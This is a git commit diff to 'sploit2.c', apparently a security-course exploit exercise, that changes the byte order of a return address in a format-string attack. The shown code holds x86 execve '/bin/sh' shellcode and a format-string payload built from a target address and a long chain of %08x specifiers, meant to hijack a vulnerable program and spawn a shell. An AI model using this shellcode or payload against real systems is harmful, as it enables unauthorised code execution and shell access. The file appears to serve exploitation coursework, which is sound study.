c81d35f2343b9520bc7d544da16c4d267fe23864
shangzw <shangzw12@163.com>
2016-10-05 21:55:50 -0400

    use catch

--- s2/sploit2.c
+++ s2/sploit2.c
@@ -10,7 +10,7 @@ int main(){
 	int p_cmd_len = 0;
   	char shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
 	char p_cmd[] = "PPP"
-			"1111""\xff\xbf\xda\x5c"
+			"1111" "\x5c\xda\xbf\xff"
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
